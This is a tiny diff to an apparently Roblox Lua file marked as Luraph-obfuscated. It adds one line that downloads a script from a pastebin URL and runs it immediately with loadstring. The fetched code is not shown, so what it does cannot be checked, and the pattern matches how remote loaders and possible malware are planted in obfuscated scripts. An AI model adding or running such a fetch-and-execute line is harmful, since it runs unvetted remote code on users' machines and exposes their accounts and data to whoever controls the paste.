@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet('https://pastebin.com/raw/YqQ11zPX'))()
 
 -- This file was generated using Luraph Obfuscator v14.0.2 [https://lura.ph/]
 
